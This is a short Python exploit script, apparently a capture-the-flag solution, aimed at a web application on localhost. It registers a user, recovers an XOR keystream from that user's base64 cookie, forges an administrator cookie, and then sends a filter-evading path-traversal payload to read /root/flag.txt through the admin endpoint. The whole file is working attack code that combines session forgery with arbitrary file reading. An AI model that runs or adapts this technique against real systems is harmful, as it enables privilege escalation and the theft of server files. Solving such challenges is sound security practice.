from base64 import b64decode, b64encode
import requests

def strxor(a, b):
    # xor two strings of different lengths
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

def retrieve_admin_cookie():
    urlLogin = "http://localhost/login"
    urlRegister = "http://localhost/register"
    user = {"email": "AAAAAAAAAAAAAAA@email.com", "password": "password"}

    # Register user
    userResponse = requests.post(urlRegister , data=user, allow_redirects=False)

    # Login user
    userResponse = requests.post(urlLogin, data=user, allow_redirects=False)
    user_cookie = userResponse.cookies["value"]

    # Decode the cookie
    decoded_cookie = b64decode(user_cookie).decode('ascii')

    # XOR the cookie with the email provided
    key = strxor(decoded_cookie, user["email"])
        
    # Generate the admin cookie
    adminEmail = "admin@ua.pt"

    # XOR the key with the admin email and encode it
    admin_cookie = b64encode(strxor(key, adminEmail).encode('ascii')).decode('ascii')

    return admin_cookie

def get_flag():
    url = "http://localhost/admin"
    file_name = '..././..././..././root/flag.txt'
    payload = {"file": file_name}

    # Request the file with the admin cookie
    response = requests.post(url, data=payload, headers={"DNT": "1"}, cookies={"value": retrieve_admin_cookie()})

    # Print the flag from the file
    print(response.text)

def main():
    get_flag()

if __name__ == "__main__":
    main()




